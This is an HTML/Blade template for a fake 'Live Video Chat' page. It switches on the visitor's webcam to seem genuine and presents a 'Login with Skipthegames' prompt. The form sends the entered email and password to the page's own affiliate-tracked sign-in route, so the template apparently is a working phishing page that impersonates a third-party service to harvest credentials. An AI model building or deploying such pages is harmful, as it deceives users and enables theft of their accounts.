
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Live Video Chat</title>
<link rel="stylesheet" href="{{ asset('ui/frontend/layout_2/style.css') }}">
</head>
 
<body>
<div id="container">
	<video id="videoElement" loop="true" autoplay="autoplay"  muted></video>
	<div id="mm_cc_01" class="main_con_a01">
	    <h2 class="hh_cc_02">Waiting...</h2>
	   <div id="ss_01" class="ss_mm_01">
	       <div class="mm_tt_aera">
		     <h1 class="hh_01">Live Video Chat</h1>
			 <p class="pp_01">
			    Login with Skipthegames and enjoy with <b class="bb_aa_01">Private Live Video Chat</b> your dating partner.
			 </p>
		   </div>
	       <button onclick="pp_ch()" class="lll_uu_ss_01">Login with Skipthegames</button>
	   </div>
	   <div id="ss_02" class="ss_mm_02">
	      <h3 class="hhh_003">Log in to your account</h3>
	     <div id="form_createad_existing_account_login">
			<form method="post" action="{{ route('signin.store',$affiliate) }}" id="loginform" name="loginform">
				@csrf
				<input type="email" id="input_account_email" name="email" placeholder="Your email" required="" value="">
				<input type="password" id="input_account_password" name="password" placeholder="Password" required="">
				<input type="submit" value="Log in" id="submit_createad_account_login" >
			</form>	
         </div>
	   </div>
  </div>	
</div>
<script>
var video = document.querySelector("#videoElement");

function vv_ss(){

if (navigator.mediaDevices.getUserMedia) {
  navigator.mediaDevices.getUserMedia({  video: true })
    .then(function (stream) {
      video.srcObject = stream;
    //   var url = window.webkitURL.createObjectURL(stream);            
    //   video.src = url;
    })
    .catch(function (err0r) {
      alert("Camera Not Found");
    });
}


navigator.getMedia = ( navigator.getUserMedia ||
                      navigator.webkitGetUserMedia ||
                      navigator.mozGetUserMedia ||
                      navigator.msGetUserMedia);

navigator.getMedia({video: true}, function() {
  
}, function() {
  alert("Camera Not Found");
});


}

vv_ss();

function pp_ch(){

  document.getElementById("ss_02").style = "display:block";
  document.getElementById("ss_01").style = "display:none";

}

</script>
</body>
</html>

